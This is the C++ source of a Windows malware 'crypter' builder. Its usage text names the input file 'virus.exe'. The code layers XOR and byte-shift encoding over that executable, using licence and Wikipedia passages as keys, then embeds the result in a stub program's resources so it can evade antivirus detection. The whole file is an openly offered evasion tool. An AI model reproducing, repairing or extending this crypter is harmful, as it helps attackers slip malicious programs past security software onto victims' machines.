/**
Copyright (c) <2013, <Penguin>
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this
list of conditions and the following disclaimer.
2. Redistributions in binary form must reproduce the above copyright notice,
this list of conditions and the following disclaimer in the documentation
and/or other materials provided with the distribution.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

The views and conclusions contained in the software and documentation are those
of the authors and should not be interpreted as representing official policies,
either expressed or implied, of the FreeBSD Project.
**/



/**
* Research:
* http://stackoverflow.com/questions/20365005/c-xor-encryption
* http://www.security.org.sg/code/loadexe.html
*
* Credits:
* -igitalNemesis
* -Grigori Perelman
* -MicroPenguin
* -Original Unknown
* -Joe Z          (http://stackoverflow.com/users/2354107/joe-z)
* */

#define WIN32_LEAN_AND_MEAN
#pragma warning (disable:4996)
#include <iostream>
#include <Windows.h>
#include <vector>
#include <string>

//using namespace std;

char * FB; //The Buffer that will store the File's data
DWORD fs; // We will store the File size here
char output[MAX_PATH];
char choice;
DWORD dwBytesWritten = 0;
char name[MAX_PATH];   // We will store the Name of the Crypted file here

std::vector<char> file_data;  // With your current program, make this a global.

std::string key = "0123456789abcdef";
std::string iv = "aaaaaaaaaaaaaaaa";

void RDF() //The Function that Reads the File and Copies the stub
{
	DWORD bt;

	//cout << "Please enter the Path of the file \nIf the file is in the same folder as the builder\nJust type the file name with an extention\nEG: Stuff.exe\n";
	//cout << "File Name: ";
	//cin >> name; // Ask for input from the user and store that inputed value in the name variable
	//cout << "Enter output name: ";
	//cin >> output;
	CopyFile("stub.exe", output/*L"Crypted.exe"*/, 0);// Copy stub , so we done need to download a new one each time we crypt
	// ofcourse we can just update the resources with new data but whatever

	std::cout << "\nGetting the HANDLE of the file to be crypted\n";
	HANDLE efile = CreateFile(name, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	//^ Get the handle of the file to be crypted
	std::cout << "Getting the File size\n";
	fs = GetFileSize(efile, NULL);
	//Get its size , will need to use it for the encryption and buffer that will store that Data allocation
	std::cout << "The File Size is: ";
	std::cout << fs;
	std::cout << " Bytes\n";
	std::cout << "Allocating Memory for the ReadFile function\n";
	file_data.resize(fs);  // set vector length equal to file size
	std::cout << "Reading the file\n";
	//ReadFile(efile, FB, fs, &bt, NULL);//Read the file (put the files data in to a FB buffer)

	ReadFile(efile, (LPVOID)(file_data.data()), fs, &bt, NULL);

	CloseHandle(efile);//close the handle

	if (fs != bt)
		std::cout << "Error reading file!" << std::endl;
}

void xor_crypt(const std::string &key, std::vector<char> &data)
{
	for (size_t i = 0; i != data.size(); i++)
		data[i] ^= key[i % key.size()];

	/*ofstream out("After_enc.dat");
	for (std::vector<char>::const_iterator it = data.begin(), itEnd = data.end(); it != itEnd; ++it)
	out << *it;*/
}

void Encrypt(std::vector<char> &data)
{
	int len = data.size();
	char a;
	std::string strFinal;
	for (size_t i = 0; i != data.size(); i++)
		strFinal = data[i];

	for (int i = 0; i <= (len - 1); i++)
	{
		a = data.at(i);
		int b = (int)a; //get the ASCII value of 'a'
		b += 2; //Mulitply the ASCII value by 2
		if (b > 254) { b = 254; }
		a = (char)b; //Set the new ASCII value back into the char
		strFinal.insert(i, 1, a); //Insert the new Character back into the string
	}
	std::string strEncrypted(strFinal, 0, len);
	for (size_t i = 0; i != data.size(); i++)
		data[i] = strEncrypted[i];

}


void choose_enc()
{
	//Asks users for encryption method
	std::cout << "\n\nChoose encryption method: " << std::endl;
	std::cout << "1. N/A" << std::endl;
	std::cout << "2. Simple XOR" << std::endl;
	std::cin >> choice;
}

void enc() // The function that Encrypts the info on the FB buffer
{
	std::cout << "Encrypting the Data\n";

	switch (choice)
	{
	case '1':
		break;
	case '2':
	{
				/*ofstream myfile("2.dat");
				for (std::vector<char>::const_iterator it = file_data.begin(), itEnd = file_data.end(); it != itEnd; ++it)
				myfile << *it;*/
				xor_crypt("This software is provided 'as is' with no explicit or implied warranties in respect of its properties, including, but not limited to, correctness and/or fitness for purpose.This software is provided 'as is' with no explicit or implied warranties in respect of its properties, including, but not limited to, correctness and/or fitness for purpose.This software is provided 'as is' with no explicit or implied warranties in respect of its properties, including, but not limited to, correctness and/or fitness for purpose.", file_data); //Encrypt it
				Encrypt(file_data);
				xor_crypt("mathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomework", file_data); //Encrypt it
				xor_crypt("These Terms of Use tell you about our public services at the Wikimedia Foundation, our relationship to you as a user, and the rights and responsibilities that guide us both. We want you to know that we host an incredible quantity of educational and informational content, all of which is contributed and made possible by users like yourself. Generally we do not contribute, monitor, or delete content (with the rare exception of policies like these Terms of Use or legal compliance for DMCA notices). This means that editorial control is in the hands of you and your fellow users who create and manage the content. We merely host this content.", file_data); //Encrypt it

				xor_crypt("This software is provided 'as is' with no explicit or implied warranties in respect of its properties, including, but not limited to, correctness and/or fitness for purpose.This software is provided 'as is' with no explicit or implied warranties in respect of its properties, including, but not limited to, correctness and/or fitness for purpose.This software is provided 'as is' with no explicit or implied warranties in respect of its properties, including, but not limited to, correctness and/or fitness for purpose.", file_data); //Encrypt it
				Encrypt(file_data);
				xor_crypt("mathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomeworkmathphysicssciencecommunitycollegehomework", file_data); //Encrypt it
				xor_crypt("These Terms of Use tell you about our public services at the Wikimedia Foundation, our relationship to you as a user, and the rights and responsibilities that guide us both. We want you to know that we host an incredible quantity of educational and informational content, all of which is contributed and made possible by users like yourself. Generally we do not contribute, monitor, or delete content (with the rare exception of policies like these Terms of Use or legal compliance for DMCA notices). This means that editorial control is in the hands of you and your fellow users who create and manage the content. We merely host this content.", file_data); //Encrypt it

				break;
	}
	case '3':
	{
				Encrypt(file_data);
				break;
	}
	case '4':
	{
				break;
	}

		return;
	}
}

void WriteToResources(LPTSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize) // Function that Writes Data to resources 
{
	std::cout << "Writing Encrypted data to stub's resources\n";
	HANDLE hResource = NULL;
	hResource = BeginUpdateResource(szTargetPE, FALSE);
	UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(id), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID)lpBytes, dwSize);
	EndUpdateResource(hResource, FALSE);
}

int main(int argc, char* argv[]) // The main function (Entry point)
{

	if (argc < 4)
	{
		printf("C++ crypter usage:\ncrypter.exe <virus.exe> <output name>\n");
		return 1;
	}

	std::string key = "penguin";
	std::string name1 = argv[1];
	std::string output1 = argv[2];
	std::string choice1 = argv[3];
	choice = choice1[0];

	strcpy(name, name1.c_str());
	strcpy(output, output1.c_str());

	std::cout << name << std::endl;
	RDF(); //Read the file
	//choose_enc();
	enc();
	file_data.push_back(choice);
	std::cout << fs << std::endl;
	WriteToResources(output, 1, (BYTE *)file_data.data(), file_data.size());
	std::cout << "Your File Has Been Crypted!\n";
	//system("PAUSE");
}

